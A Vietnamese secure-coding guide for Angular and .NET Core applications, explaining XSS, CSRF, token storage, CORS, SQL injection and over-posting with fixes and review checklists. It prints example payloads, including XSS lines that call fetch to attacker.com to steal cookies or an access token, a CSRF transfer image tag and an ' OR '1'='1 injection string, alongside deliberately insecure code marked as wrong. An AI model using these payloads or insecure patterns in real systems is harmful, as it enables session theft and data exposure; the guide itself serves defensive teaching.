# Security cho Web Application (Angular + .NET Core)

> Tài liệu này tổng hợp tư duy và kỹ thuật bảo mật cần biết khi xây dựng ứng dụng web full-stack với Angular (frontend) và .NET Core (backend). Nội dung đi từ nền tảng đến nâng cao, phục vụ cho việc thiết kế, code review và trả lời phỏng vấn về bảo mật ứng dụng.

---

## Mục tiêu tài liệu

Sau khi đọc xong, người đọc cần trả lời được các câu hỏi sau:

```text
1. Vì sao security không phải là việc "thêm vào sau cùng"?
2. XSS là gì, Angular tự bảo vệ được đến đâu và khi nào KHÔNG?
3. CSRF là gì, SPA dùng token có còn cần lo CSRF không?
4. JWT nên lưu ở đâu: localStorage hay cookie? Trade-off là gì?
5. CORS thực chất bảo vệ ai — server hay client?
6. SQL Injection còn xảy ra được với EF Core không?
7. Secret/connection string nên quản lý thế nào giữa FE và BE?
8. Khi review code, cần nhìn vào những điểm nào để phát hiện lỗ hổng?
```

---

## 1. Tư duy bảo mật cơ bản

### 1.1. Vì sao security không phải là việc "biết sau cũng được"

Cách nghĩ phổ biến nhưng sai: security là việc của "team bảo mật" hoặc chỉ cần bật HTTPS là đủ. Thực tế phần lớn lỗ hổng nghiêm trọng nằm ngay trong logic nghiệp vụ hằng ngày:

```text
- Component render HTML từ dữ liệu user nhập.
- API không kiểm tra lại quyền, chỉ tin request từ FE.
- Token lưu sai chỗ, dễ bị đánh cắp.
- Câu SQL nối chuỗi thủ công.
- CORS mở toàn bộ vì "cho dễ test".
```

Không cần biết hết mọi kỹ thuật tấn công, nhưng bắt buộc phải có phản xạ: **không tin bất kỳ dữ liệu nào đến từ phía client**, kể cả dữ liệu do chính FE của mình gửi lên.

### 1.2. Threat model đơn giản

Trước khi thiết kế một tính năng, nên tự hỏi:

```text
Ai có thể là attacker?
  - Người dùng bình thường cố tình thao túng request.
  - Người dùng khác trong hệ thống (đa tenant, đa phòng ban).
  - Một script/bot tự động.
  - Một bên thứ ba chèn nội dung độc hại (XSS) rồi lợi dụng chính user hợp lệ.

Tài sản cần bảo vệ là gì?
  - Access token, session.
  - Dữ liệu cá nhân, dữ liệu tài chính.
  - Quyền thao tác (tạo, sửa, xóa, duyệt).

Attacker có thể lợi dụng đường nào?
  - Request API trực tiếp (không qua UI).
  - Trình duyệt của một user khác (XSS/CSRF).
  - Cấu hình hạ tầng sai (CORS, header, secret lộ).
```

### 1.3. Nguyên tắc nền tảng

```text
Defense in depth
→ Không dựa vào một lớp bảo vệ duy nhất. FE validate không thay thế BE validate.

Least privilege
→ Component/service/API chỉ nên có đúng quyền cần thiết, không hơn.

Fail secure
→ Khi có lỗi hoặc không chắc chắn, mặc định từ chối thay vì cho phép.

Không tin dữ liệu client
→ userId, role, price, quantity gửi từ FE đều phải được BE xác minh lại.
```

---

## 2. OWASP Top 10 — bản đồ tổng quan

OWASP Top 10 là danh sách các nhóm lỗ hổng phổ biến nhất trong ứng dụng web. Đây không phải danh sách để học thuộc, mà là bản đồ để biết mình đang thiếu phần nào.

| Nhóm | Ý nghĩa ngắn gọn | Phần liên quan trong tài liệu này |
|---|---|---|
| Broken Access Control | Không kiểm tra lại quyền ở BE | Mục 5 |
| Cryptographic Failures | Lộ dữ liệu do mã hóa sai/thiếu | Mục 8 |
| Injection | SQL Injection, command injection | Mục 7 |
| Insecure Design | Thiết kế thiếu tư duy bảo mật từ đầu | Mục 1 |
| Security Misconfiguration | CORS mở, header thiếu, debug mode bật ở prod | Mục 6, 9 |
| Vulnerable Components | Dùng thư viện có lỗ hổng đã biết | Mục 10 |
| Auth & Session Failures | Quản lý token/session sai | Mục 5 |
| Software/Data Integrity | Thiếu kiểm tra tính toàn vẹn của package/CI | Mục 10 |
| Logging & Monitoring Failures | Không phát hiện được khi bị tấn công | Nhắc ở Mục 12 |
| SSRF | Server bị lừa gọi ngược vào hệ thống nội bộ | Nhắc ở Mục 7 |

Với ứng dụng Angular + .NET Core thông thường, 4 nhóm hay gặp nhất trong thực tế là: **Broken Access Control**, **Security Misconfiguration**, **Injection**, **Auth & Session Failures**. Tài liệu này tập trung sâu vào 4 nhóm đó.

---

## 3. Cross-Site Scripting (XSS)

### 3.1. XSS là gì

XSS xảy ra khi attacker chèn được script vào trang mà trình duyệt của **user khác** thực thi, không phải của attacker.

Ba dạng chính:

```text
Stored XSS
→ Script độc hại được lưu trong DB (ví dụ: nội dung bình luận), mọi user xem trang đều bị dính.

Reflected XSS
→ Script nằm trong request (ví dụ: query string), server phản chiếu lại nguyên văn vào response.

DOM-based XSS
→ Script không qua server, mà JS phía client tự lấy dữ liệu không an toàn rồi ghi vào DOM.
```

Ví dụ payload kinh điển:

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Nếu payload này được render thành HTML thật trên trang, nó sẽ chạy bằng quyền của user đang xem trang — không phải quyền của attacker.

### 3.2. Angular tự bảo vệ được đến đâu

Angular escape dữ liệu theo mặc định khi dùng interpolation:

```html
<p>{{ comment.content }}</p>
```

Nếu `comment.content` là `<script>...</script>`, Angular sẽ render nó như **text**, không phải HTML thật. Đây là lý do phần lớn Angular app không bị XSS "ngẫu nhiên" dù không ai chủ động phòng thủ.

### 3.3. Khi nào Angular KHÔNG tự bảo vệ được

Vấn đề xuất hiện khi code chủ động yêu cầu Angular render HTML thật:

```html
<div [innerHTML]="comment.content"></div>
```

Angular vẫn có một lớp sanitizer chặn thẻ/thuộc tính nguy hiểm (`<script>`, `onerror`, `javascript:`...), nhưng nếu code bypass sanitizer:

```ts
constructor(private sanitizer: DomSanitizer) {}

renderRaw(html: string) {
  return this.sanitizer.bypassSecurityTrustHtml(html);
}
```

thì Angular tin tưởng hoàn toàn nội dung đó là an toàn. Nếu `html` đến từ user nhập hoặc từ API không kiểm soát được, `bypassSecurityTrustHtml` chính là nơi mở khóa cho XSS.

Rule thực tế:

```text
- Ưu tiên interpolation {{ }} thay vì [innerHTML].
- Nếu bắt buộc render HTML (markdown, rich text), để sanitizer Angular tự xử lý, không bypass.
- Chỉ bypassSecurityTrust* khi chắc chắn 100% nguồn dữ liệu là tin cậy (ví dụ: nội dung do chính hệ thống sinh ra, không phải do user nhập).
- Không bao giờ dùng bypassSecurityTrustHtml cho nội dung markdown/HTML lấy trực tiếp từ user hoặc từ file không kiểm soát.
```

### 3.4. Ví dụ thực tế: render nội dung do user nhập

Bài toán: hiển thị mô tả sản phẩm do nhân viên nhập, cho phép định dạng cơ bản (in đậm, xuống dòng, link).

Sai:

```ts
get safeHtml() {
  return this.sanitizer.bypassSecurityTrustHtml(this.product.descriptionHtml);
}
```

Nếu `descriptionHtml` bị chèn:

```html
<img src="x" onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

thì mọi user xem sản phẩm này đều bị đánh cắp cookie.

Đúng hơn:

```html
<div [innerHTML]="product.descriptionHtml"></div>
```

Không gọi `bypassSecurityTrustHtml`. Angular tự sanitize, loại bỏ `onerror`, `<script>`, `javascript:` trước khi render. Nếu cần rich text nâng cao hơn, nên dùng thư viện markdown/HTML sanitizer chuyên dụng ở tầng BE trước khi lưu, thay vì tin hoàn toàn vào sanitizer phía FE.

### 3.5. Content Security Policy (CSP)

CSP là header giúp trình duyệt biết trang chỉ được phép load script/style/image từ nguồn nào, giảm thiệt hại nếu XSS vẫn lọt qua.

Ví dụ header:

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
```

Ý nghĩa:

```text
default-src 'self'  → mặc định chỉ load tài nguyên từ cùng domain.
script-src 'self'   → không cho script inline hoặc từ domain lạ chạy.
connect-src         → giới hạn API mà trang được phép gọi.
```

CSP không thay thế việc phòng XSS ở tầng code, nhưng là lớp phòng thủ thứ hai: dù attacker chèn được `<script src="https://attacker.com/x.js">`, trình duyệt vẫn chặn vì domain không nằm trong `script-src`.

---

## 4. Cross-Site Request Forgery (CSRF)

### 4.1. CSRF là gì

CSRF lợi dụng việc trình duyệt tự động đính kèm cookie khi gọi request, khiến một trang độc hại có thể "mượn" phiên đăng nhập của user để thực hiện hành động ngoài ý muốn.

Ví dụ kịch bản:

```text
User đang đăng nhập ngân hàng, cookie session còn hiệu lực.
User mở một trang lạ chứa:

  <img src="https://bank.example.com/api/transfer?to=attacker&amount=1000000">

Nếu API transfer chỉ dựa vào cookie để xác thực và là GET/không check gì thêm,
trình duyệt vẫn tự gửi cookie kèm request này, ngân hàng tưởng là user tự thao tác.
```

### 4.2. SPA dùng Bearer token có còn cần lo CSRF không?

Nếu Angular gửi token qua header:

```ts
headers: { Authorization: `Bearer ${token}` }
```

thì CSRF gần như không còn nguy cơ, vì trang độc hại không có cách nào tự động gắn header `Authorization` vào request của nó — cookie mới bị trình duyệt tự động đính kèm, header thì không.

Nhưng nếu hệ thống dùng **cookie-based authentication** (session cookie, hoặc lưu JWT trong cookie để tiện SSR), CSRF vẫn là rủi ro thật.

### 4.3. SameSite cookie

Cách giảm rủi ro đơn giản và hiệu quả nhất hiện nay:

```text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

```text
SameSite=Strict → cookie không gửi kèm khi request bắt nguồn từ site khác.
SameSite=Lax    → cho phép một số trường hợp điều hướng GET, chặn phần lớn CSRF thực tế.
SameSite=None   → cookie gửi cross-site (cần cho một số tích hợp), phải luôn đi kèm Secure.
```

### 4.4. Anti-forgery token trong .NET Core

Với ứng dụng dùng cookie authentication, .NET Core hỗ trợ sẵn:

```csharp
builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
});
```

Endpoint cấp token:

```csharp
app.MapGet("/api/antiforgery/token", (IAntiforgery antiforgery, HttpContext http) =>
{
    var tokens = antiforgery.GetAndStoreTokens(http);
    return Results.Ok(new { token = tokens.RequestToken });
});
```

Angular gửi kèm token này trong header cho các request thay đổi dữ liệu (POST/PUT/DELETE), BE validate token đó khớp với cookie hiện tại trước khi xử lý.

### 4.5. Khi nào bắt buộc phải nghĩ tới CSRF

```text
- Hệ thống dùng cookie để xác thực (session hoặc JWT trong cookie).
- Có SSR (Server-Side Rendering) và cần cookie cho lần render đầu.
- Có tích hợp iframe/embed từ domain khác.
```

Nếu hệ thống thuần SPA + Bearer token trong header + không dùng cookie cho auth, CSRF không phải ưu tiên hàng đầu, nhưng vẫn nên set `SameSite` cho mọi cookie khác (ví dụ cookie theo dõi phiên UI) như một lớp phòng thủ mặc định.

---

## 5. Authentication & Authorization

### 5.1. Phân biệt hai khái niệm

```text
Authentication (xác thực)
→ Bạn là ai? Đăng nhập đúng chưa?

Authorization (phân quyền)
→ Bạn có được phép làm việc này không?
```

Một lỗi rất phổ biến: hệ thống xác thực rất chặt (login, MFA đầy đủ) nhưng sau khi đăng nhập, API không kiểm tra lại quyền cho từng thao tác — đây chính là **Broken Access Control**, đứng đầu OWASP Top 10.

### 5.2. Session cookie vs JWT

```text
Session cookie
  + Server có thể revoke ngay lập tức (xóa session).
  + Không lộ nội dung ra client.
  - Cần lưu trạng thái ở server (hoặc Redis dùng chung).
  - Cần xử lý CSRF.

JWT (stateless token)
  + Không cần lưu trạng thái ở server, dễ scale nhiều instance.
  + Tự chứa thông tin (claims), server chỉ cần verify chữ ký.
  - Khó revoke trước khi hết hạn (cần thêm cơ chế blacklist/refresh token).
  - Nếu lộ token, attacker dùng được đến khi hết hạn.
```

Không có lựa chọn nào "luôn đúng". Hệ thống nhiều instance, nhiều service, ưu tiên JWT + refresh token. Hệ thống đơn giản, ít service, session cookie vẫn là lựa chọn an toàn và dễ kiểm soát hơn.

### 5.3. JWT nên lưu ở đâu trên trình duyệt?

```text
localStorage / sessionStorage
  + Dễ dùng, tự tay gắn vào header.
  - Bất kỳ script nào chạy được trên trang (kể cả do XSS) đều đọc được toàn bộ localStorage.

HttpOnly Cookie
  + JavaScript không đọc được (kể cả khi bị XSS), giảm thiệt hại khi bị XSS.
  - Phải xử lý CSRF (mục 4).
  - Phức tạp hơn một chút khi làm CORS + credentials.
```

Đánh đổi thực tế:

```text
localStorage → dễ bị XSS đánh cắp token, nhưng miễn nhiễm CSRF.
HttpOnly cookie → miễn nhiễm XSS đọc trộm token, nhưng phải phòng CSRF.
```

Với hệ thống có dữ liệu nhạy cảm (tài chính, y tế), khuyến nghị thực tế: **access token thời gian sống ngắn** (5–15 phút) trong bộ nhớ JS (biến trong service, không phải localStorage), **refresh token** trong HttpOnly cookie. Cách này giảm cả rủi ro XSS lẫn CSRF, đổi lại phức tạp hơn khi implement.

### 5.4. Refresh token rotation

```text
Access token hết hạn nhanh (ví dụ 10 phút).
Refresh token dùng để lấy access token mới, thời gian sống dài hơn (ví dụ 7 ngày).

Khi refresh:
  - Refresh token cũ bị vô hiệu hóa ngay (rotation).
  - Cấp refresh token mới.
  - Nếu refresh token cũ bị dùng lại lần nữa (dấu hiệu bị đánh cắp)
    → thu hồi toàn bộ chuỗi token, bắt đăng nhập lại.
```

### 5.5. Ví dụ cấu hình JWT Bearer trong .NET Core

```csharp
builder.Services
    .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = config["Jwt:Issuer"],
            ValidAudience = config["Jwt:Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(config["Jwt:SigningKey"]!)),
            ClockSkew = TimeSpan.FromSeconds(30)
        };
    });
```

Điểm hay bị bỏ sót: `ValidateLifetime = true` và `ClockSkew` nhỏ. Nếu để `ClockSkew` mặc định (5 phút), token đã hết hạn vẫn được chấp nhận thêm 5 phút — chấp nhận được với hệ thống thường, nhưng cần cân nhắc với nghiệp vụ nhạy cảm.

### 5.6. Angular interceptor gắn token an toàn

```ts
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const tokenService = inject(TokenService);
  const token = tokenService.getAccessToken();

  if (!token || isPublicEndpoint(req.url)) {
    return next(req);
  }

  return next(
    req.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    })
  );
};
```

Điểm cần chú ý: chỉ gắn token cho request gọi về API của chính hệ thống, không gắn cho request gọi ra domain thứ ba (ví dụ CDN, dịch vụ bên ngoài) — tránh vô tình làm lộ token cho bên khác.

### 5.7. Authorization: role-based vs policy-based

```csharp
[Authorize(Roles = "Admin")]
public IActionResult DeleteUser(int id) { ... }
```

Role-based đơn giản nhưng cứng nhắc. Với nghiệp vụ phức tạp hơn (ví dụ: chỉ trưởng phòng của chính phòng ban đó mới được duyệt), nên dùng policy:

```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanApproveOwnDepartment", policy =>
        policy.Requirements.Add(new SameDepartmentRequirement()));
});
```

```csharp
public class SameDepartmentRequirement : IAuthorizationRequirement { }

public class SameDepartmentHandler
    : AuthorizationHandler<SameDepartmentRequirement, Order>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        SameDepartmentRequirement requirement,
        Order resource)
    {
        var userDeptId = context.User.FindFirst("departmentId")?.Value;

        if (userDeptId == resource.DepartmentId.ToString())
        {
            context.Succeed(requirement);
        }

        return Task.CompletedTask;
    }
}
```

Đây gọi là **resource-based authorization**: quyền không chỉ phụ thuộc vào role, mà phụ thuộc vào chính resource đang thao tác. Chỉ check role là chưa đủ — luôn cần hỏi thêm "user này có quyền trên đúng resource này không".

### 5.8. Lỗi phổ biến nhất: chỉ check quyền ở FE

```ts
@if (currentUser.role === 'Admin') {
  <button (click)="deleteUser(user.id)">Xóa</button>
}
```

Ẩn nút trên UI **không phải là bảo mật**, chỉ là UX. Nếu API `DELETE /api/users/{id}` không tự kiểm tra `[Authorize(Roles = "Admin")]` hoặc policy tương ứng, bất kỳ ai biết endpoint đều gọi thẳng được bằng Postman hoặc DevTools, bất kể FE có ẩn nút hay không.

Rule bắt buộc:

```text
Mọi quyết định về quyền phải được BE xác nhận lại.
FE chỉ ẩn/hiện để trải nghiệm tốt hơn, không phải để chặn.
```

---

## 6. CORS — hiểu đúng bản chất

### 6.1. CORS bảo vệ ai?

Đây là điểm bị hiểu sai nhiều nhất: **CORS không bảo vệ server, CORS bảo vệ user thông qua trình duyệt**.

```text
Server luôn nhận được request dù CORS chặn hay không.
CORS chỉ là cơ chế để trình duyệt quyết định có cho JavaScript
ở domain khác ĐỌC response đó hay không.
```

Nói cách khác: một API không có CORS header vẫn hoàn toàn có thể bị gọi bằng `curl`, Postman, hoặc server-to-server — CORS không ngăn được điều đó. CORS chỉ ngăn `fetch()` chạy trên trình duyệt của user đọc được response từ domain khác nếu server không cho phép.

### 6.2. Sai lầm kinh điển: AllowAnyOrigin + AllowCredentials

```csharp
// Sai — sẽ bị .NET Core từ chối start hoặc bị trình duyệt chặn
app.UseCors(policy => policy
    .AllowAnyOrigin()
    .AllowCredentials());
```

Kết hợp này bị chặn có chủ đích vì nếu cho phép, bất kỳ trang nào trên Internet cũng có thể gọi API kèm cookie/credential của user và đọc được response — biến CORS thành vô nghĩa.

Cấu hình đúng:

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Default", policy =>
    {
        policy
            .WithOrigins("https://app.example.com")
            .AllowCredentials()
            .AllowAnyHeader()
            .AllowAnyMethod();
    });
});
```

`WithOrigins` liệt kê rõ domain được tin tưởng, không dùng wildcard khi có `AllowCredentials`.

### 6.3. CORS "mở hết cho dễ test" là một nợ kỹ thuật bảo mật

```text
Môi trường dev: mở rộng CORS để tiện làm việc — chấp nhận được.
Môi trường production: bắt buộc liệt kê chính xác domain được phép.
```

Nhiều sự cố thực tế xảy ra vì cấu hình "tạm thời cho dev" bị mang thẳng lên production.

---

## 7. Injection & Input Validation

### 7.1. SQL Injection còn xảy ra với EF Core không?

EF Core mặc định dùng parameterized query, nên LINQ thông thường đã an toàn:

```csharp
var user = await _db.Users
    .FirstOrDefaultAsync(u => u.Email == email);
```

Câu SQL sinh ra dùng tham số (`@p0`), không nối chuỗi trực tiếp — an toàn với injection.

Rủi ro quay lại khi dùng raw SQL nối chuỗi thủ công:

```csharp
// Nguy hiểm
var sql = $"SELECT * FROM Users WHERE Email = '{email}'";
var user = await _db.Users.FromSqlRaw(sql).FirstOrDefaultAsync();
```

Nếu `email` là:

```text
' OR '1'='1
```

câu SQL thực tế trở thành:

```sql
SELECT * FROM Users WHERE Email = '' OR '1'='1'
```

trả về toàn bộ user thay vì một user cụ thể.

Cách đúng khi bắt buộc dùng raw SQL:

```csharp
var user = await _db.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Email = {email}")
    .FirstOrDefaultAsync();
```

`FromSqlInterpolated` tự động parameterize giá trị đưa vào, khác hoàn toàn với nối chuỗi bằng `$""` trong `FromSqlRaw`.

### 7.2. Validation ở đâu là đủ?

```text
Client-side validation
→ Chỉ để UX tốt hơn (báo lỗi ngay, không cần chờ round-trip).
→ Không có giá trị bảo mật, vì attacker có thể gọi thẳng API.

Server-side validation
→ Bắt buộc. Đây là nơi quyết định dữ liệu có hợp lệ hay không.
```

Ví dụ dùng FluentValidation trong .NET Core:

```csharp
public class CreateOrderValidator : AbstractValidator<CreateOrderRequest>
{
    public CreateOrderValidator()
    {
        RuleFor(x => x.Quantity).GreaterThan(0);
        RuleFor(x => x.ProductId).NotEmpty();
        RuleFor(x => x.Note).MaximumLength(500);
    }
}
```

Một lỗi hay gặp: FE validate `quantity > 0` rất kỹ, nhưng BE tin tưởng luôn nhận `quantity` hợp lệ và dùng thẳng để trừ tồn kho — attacker gọi thẳng API với `quantity = -100` để cộng ngược tồn kho.

### 7.3. Mass assignment / Over-posting

```csharp
public class UpdateUserRequest
{
    public string FullName { get; set; }
    public string Role { get; set; }   // không nên cho client tự set
}

[HttpPut("{id}")]
public async Task<IActionResult> Update(int id, UpdateUserRequest request)
{
    var user = await _db.Users.FindAsync(id);
    user.FullName = request.FullName;
    user.Role = request.Role;   // nguy hiểm: user tự đổi role thành Admin
    await _db.SaveChangesAsync();
    return Ok();
}
```

Nếu DTO request chứa cả field nhạy cảm như `Role`, `IsAdmin`, `Balance`, và code map thẳng từ request vào entity, user hoàn toàn có thể tự leo quyền bằng cách thêm field đó vào JSON body dù UI không hiển thị field đó.

Rule: DTO input chỉ nên chứa field mà client **được phép** thay đổi. Field nhạy cảm như role/quyền phải qua một API/luồng riêng có kiểm tra quyền chặt hơn.

---

## 8. Secrets & Configuration

### 8.1. Không commit secret vào git

```text
Không commit:
  - Connection string thật.
  - API key, signing key.
  - Client secret của OAuth.
  - File appsettings.Production.json chứa giá trị thật.
```

Nếu secret lỡ bị commit, đổi secret đó ngay — xóa khỏi lịch sử git không đủ, vì secret coi như đã lộ vĩnh viễn.

### 8.2. Quản lý secret theo môi trường

```text
Local dev     → User Secrets (dotnet user-secrets) hoặc .env không commit.
CI/CD         → biến môi trường được inject bởi pipeline, không hard-code trong script.
Production    → Azure Key Vault / AWS Secrets Manager / vault nội bộ.
```

Ví dụ .NET Core đọc từ nhiều nguồn theo thứ tự ưu tiên:

```csharp
builder.Configuration
    .AddJsonFile("appsettings.json")
    .AddJsonFile($"appsettings.{env.EnvironmentName}.json", optional: true)
    .AddEnvironmentVariables()
    .AddAzureKeyVault(keyVaultUri, credential);
```

### 8.3. Angular không có "secret" thật sự an toàn

Đây là điểm nhiều dev mới hiểu nhầm: mọi thứ nằm trong bundle Angular (kể cả trong `environment.ts`) đều được **build ra file JS công khai**, ai cũng tải về và đọc được.

```ts
export const environment = {
  apiKey: 'sk-xxxxxxxx'   // sai lầm — đây không phải chỗ giấu secret
};
```

Rule:

```text
Bất cứ thứ gì cần giữ bí mật thật sự (API key trả phí, signing key)
phải nằm ở BE, không bao giờ đưa vào code Angular.
Angular chỉ nên giữ config public: API base URL, feature flag không nhạy cảm.
```

---

## 9. Security Headers

Một số header quan trọng nên có ở mọi ứng dụng production:

| Header | Ý nghĩa |
|---|---|
| `Content-Security-Policy` | Giới hạn nguồn script/style/image được phép load |
| `X-Content-Type-Options: nosniff` | Chặn trình duyệt tự đoán content-type, giảm rủi ro thực thi nhầm |
| `X-Frame-Options: DENY` | Chặn trang bị nhúng trong iframe (chống clickjacking) |
| `Strict-Transport-Security` | Bắt buộc trình duyệt luôn dùng HTTPS cho domain này |
| `Referrer-Policy: strict-origin-when-cross-origin` | Giảm rò rỉ URL nội bộ qua header Referer |

Cấu hình nhanh trong .NET Core middleware:

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
    context.Response.Headers.Append("X-Frame-Options", "DENY");
    context.Response.Headers.Append("Referrer-Policy", "strict-origin-when-cross-origin");
    context.Response.Headers.Append(
        "Strict-Transport-Security", "max-age=31536000; includeSubDomains");

    await next();
});
```

---

## 10. Dependency & Supply Chain

Phần lớn ứng dụng hiện đại phụ thuộc hàng trăm package gián tiếp. Một lỗ hổng trong package con cũng ảnh hưởng trực tiếp đến ứng dụng.

```bash
npm audit
dotnet list package --vulnerable
```

Thực hành tối thiểu:

```text
- Chạy audit định kỳ (CI pipeline), không chỉ khi nhớ ra.
- Không tự ý nâng version lớn hàng loạt mà không đọc changelog.
- Khóa version bằng lockfile (package-lock.json), tránh cài bản mới ngoài ý muốn.
- Cân nhắc kỹ trước khi thêm một package lạ, ít người dùng, không còn maintain.
```

---

## 11. Case Studies

### 11.1. Case Study 1 — JWT trong localStorage bị đánh cắp qua XSS

#### Bối cảnh

```text
Hệ thống lưu access token trong localStorage.
Một tính năng cho phép nhân viên nhập "ghi chú nội bộ" hiển thị bằng [innerHTML]
kèm bypassSecurityTrustHtml vì "ghi chú cần format đẹp".
```

#### Kịch bản tấn công

```text
Attacker (một nhân viên có quyền thấp) nhập ghi chú chứa:

<img src="x" onerror="fetch('https://attacker.com/x?t='+localStorage.getItem('access_token'))">

Bất kỳ ai xem lại ghi chú này (kể cả quản lý cấp cao) đều bị gửi trộm token.
Attacker dùng token đó gọi API với quyền của nạn nhân.
```

#### Nguyên nhân gốc

```text
1. bypassSecurityTrustHtml cho nội dung do user nhập.
2. Token nhạy cảm lưu ở nơi JavaScript đọc được (localStorage).
```

#### Cách khắc phục

```text
- Bỏ bypassSecurityTrustHtml, để Angular sanitizer tự lọc HTML.
- Chuyển access token sang bộ nhớ trong service (biến JS thường,
  không phải localStorage), refresh token đặt trong HttpOnly cookie.
- Thêm CSP để hạn chế thiệt hại nếu vẫn còn XSS ở đâu đó.
```

### 11.2. Case Study 2 — API không check lại quyền trên resource

#### Bối cảnh

```text
API cập nhật đơn hàng:

PUT /api/orders/{id}

BE chỉ check [Authorize] (đã đăng nhập), không check
đơn hàng {id} có thuộc đúng phòng ban/chi nhánh của user hay không.
```

#### Kịch bản tấn công

```text
User A thuộc chi nhánh 1, đăng nhập hợp lệ.
User A đổi id trên URL từ đơn hàng của chi nhánh 1
sang id của đơn hàng thuộc chi nhánh 2 (đoán hoặc thấy lộ qua API khác).
API vẫn xử lý bình thường vì chỉ check "đã đăng nhập chưa",
không check "đơn hàng này có phải của user A không".
```

Đây là lỗi **IDOR (Insecure Direct Object Reference)** — một dạng cụ thể của Broken Access Control.

#### Cách khắc phục

```csharp
var order = await _db.Orders.FindAsync(id);

if (order.BranchId != currentUser.BranchId)
{
    return Forbid();
}
```

Rule tổng quát: mọi endpoint nhận `id` từ URL/body đều phải tự hỏi "resource này có thuộc về user đang gọi không", không chỉ hỏi "user có đăng nhập không".

### 11.3. Case Study 3 — CORS cấu hình sai lộ API nội bộ

#### Bối cảnh

```text
Team dev bật AllowAnyOrigin() trong giai đoạn demo để tiện tích hợp
nhiều frontend thử nghiệm, rồi quên đổi lại trước khi lên production.
```

#### Hậu quả

```text
Một trang bất kỳ trên Internet có thể nhúng script gọi thẳng API nội bộ.
Nếu API dùng cookie-based auth và vô tình cũng bật AllowCredentials,
request từ trang lạ có thể mượn luôn phiên đăng nhập của user
đang mở cả hai tab (site độc hại + hệ thống nội bộ).
```

#### Cách khắc phục

```text
- Định nghĩa rõ danh sách origin theo từng môi trường (dev/staging/production).
- Không bao giờ để AllowAnyOrigin() đi cùng AllowCredentials() ở bất kỳ môi trường nào.
- Review CORS policy như một phần bắt buộc trước khi release, không chỉ review lúc setup ban đầu.
```

---

## 12. Checklist review Security

### 12.1. Checklist cho Angular/Frontend

```text
1. Có chỗ nào dùng [innerHTML] kèm bypassSecurityTrustHtml cho dữ liệu từ user không?
2. Token nhạy cảm đang lưu ở đâu — localStorage hay bộ nhớ tạm/cookie?
3. Interceptor có gắn Authorization header cho domain thứ ba ngoài ý muốn không?
4. Có logic phân quyền nào chỉ tồn tại ở FE mà không được BE xác nhận lại không?
5. Có secret/API key nào bị đặt trong environment.ts hoặc code Angular không?
6. Input từ user có được escape đúng trước khi render không?
```

### 12.2. Checklist cho .NET Core/Backend

```text
1. Mọi endpoint thay đổi dữ liệu có [Authorize] hoặc policy phù hợp chưa?
2. Có endpoint nào chỉ check "đã đăng nhập" mà thiếu check "có đúng resource của mình" (IDOR)?
3. DTO input có chứa field nhạy cảm (role, balance, isAdmin) mà client không nên tự set không?
4. Có raw SQL nào nối chuỗi thủ công thay vì dùng parameter/FromSqlInterpolated không?
5. CORS có đang AllowAnyOrigin kèm AllowCredentials không?
6. Secret/connection string có nằm trong file commit vào git không?
7. Security headers cơ bản (CSP, X-Frame-Options, HSTS) đã có chưa?
8. Refresh token có cơ chế rotation và phát hiện tái sử dụng không?
9. Log có ghi lại được các hành vi đáng ngờ (nhiều lần từ chối quyền, nhiều lần login sai) không?
```

---

## 13. Tóm tắt và lộ trình học tiếp

### 13.1. Tóm tắt nhanh

```text
XSS
→ Script lạ chạy trên trình duyệt user khác. Angular tự escape interpolation,
  nhưng [innerHTML] + bypassSecurityTrustHtml là nơi mở khóa nếu dùng sai.

CSRF
→ Trình duyệt tự động gửi cookie kèm request. Bearer token trong header giảm
  rủi ro này; cookie-based auth cần SameSite + anti-forgery token.

Authentication vs Authorization
→ Xác thực là "bạn là ai", phân quyền là "bạn được làm gì". Broken Access
  Control (thiếu check quyền ở BE) là lỗi phổ biến và nghiêm trọng nhất.

CORS
→ Bảo vệ user qua trình duyệt, không bảo vệ server. AllowAnyOrigin +
  AllowCredentials là cấu hình nguy hiểm kinh điển.

Injection
→ EF Core an toàn với LINQ thông thường; nguy hiểm quay lại khi nối chuỗi
  raw SQL thủ công.

Secrets
→ Không có gì trong Angular bundle là bí mật thật sự. Secret luôn thuộc về BE.
```

### 13.2. Cách nói ngắn gọn khi cần giải thích

> Bảo mật web application không phải một tính năng thêm vào sau cùng, mà là một tập giả định phải đúng xuyên suốt: không tin dữ liệu từ client, luôn xác thực lại quyền ở server cho đúng resource, và hiểu rõ trade-off giữa các cơ chế lưu token. Với Angular, rủi ro lớn nhất là XSS khi bypass sanitizer để render HTML từ user. Với .NET Core, rủi ro lớn nhất là Broken Access Control — kiểm tra "đã đăng nhập" nhưng quên kiểm tra "có đúng quyền trên đúng resource" hay chưa.

### 13.3. Lộ trình học tiếp

```text
1. Testing (unit/integration/e2e) — milestone tiếp theo.
2. Security testing cơ bản: kiểm thử thủ công XSS/IDOR trên chính tính năng mình làm.
3. Logging & Observability — phát hiện tấn công qua log bất thường.
4. Rate limiting & chống brute-force cho endpoint đăng nhập.
5. OAuth2/OpenID Connect chuyên sâu nếu hệ thống tích hợp đăng nhập bên thứ ba.
6. Threat modeling có cấu trúc hơn (STRIDE) khi thiết kế tính năng mới.
```

### 13.4. Kết luận

```text
Security không phải danh sách quy tắc để nhớ, mà là một câu hỏi lặp lại
ở mọi tính năng: "nếu dữ liệu/request này đến từ một attacker chứ không
phải user hợp lệ, hệ thống có còn xử lý đúng không?"
```
